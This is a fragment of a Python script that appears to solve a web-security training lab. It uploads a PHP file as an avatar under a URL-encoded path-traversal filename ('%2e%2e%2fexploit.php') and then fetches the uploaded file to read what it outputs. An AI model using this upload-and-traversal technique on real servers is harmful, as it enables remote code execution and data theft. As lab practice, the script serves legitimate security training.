...
app_url = "https://0a9f00ec04991cf2831f82ff009b0052.web-security-academy.net"     #application url
...
files = {'avatar':('%2e%2e%2fexploit.php',exploit,'application/x-php'),
         'user': (None,'wiener'),
         'csrf': (None,ftoken2)
         }
...
#fetch file content
exp_res = win_session.get(app_url+"/files/exploit.php",verify=False)
answer = exp_res.text
print(answer)
